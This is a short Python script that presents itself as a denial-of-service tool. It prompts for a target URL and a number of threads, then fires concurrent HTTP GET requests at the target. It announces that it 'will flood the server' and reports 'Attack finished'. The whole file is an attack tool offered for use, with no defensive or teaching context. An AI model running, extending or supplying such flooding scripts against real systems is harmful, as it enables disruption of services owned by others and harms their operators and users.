import requests
import threading
import sys
from datetime import datetime

try:
    from colorama import Fore, Style, init
    init(autoreset=True)
except:
    class Dummy:
        def __getattr__(self, _): return ''
    Fore = Style = Dummy()

# Function to send HTTP requests
def send_request(url):
    try:
        response = requests.get(url, timeout=5)
        if response.status_code == 200:
            print(Fore.GREEN + f"[✓] Request sent to {url} - Status: {response.status_code}")
        else:
            print(Fore.YELLOW + f"[?] Request sent to {url} - Status: {response.status_code}")
    except requests.exceptions.RequestException as e:
        print(Fore.RED + f"[!] Error while sending request to {url}: {e}")

# Main function to handle DoS
def run_dos_attack():
    url = input("Enter target URL (e.g. http://target.com/page.php?id=1): ")
    threads = int(input("Enter number of threads (e.g. 100): "))

    print(f"\n[+] Starting DoS attack on {url} with {threads} threads...\n")
    print("[!] Please note, this will flood the server with requests.")

    # Create a list to keep track of threads
    thread_list = []
    for _ in range(threads):
        thread = threading.Thread(target=send_request, args=(url,))
        thread_list.append(thread)
        thread.start()

    # Wait for all threads to finish
    for thread in thread_list:
        thread.join()

    print(Fore.RED + "\n[!] Attack finished.")

# Start the attack
if __name__ == "__main__":
    run_dos_attack()
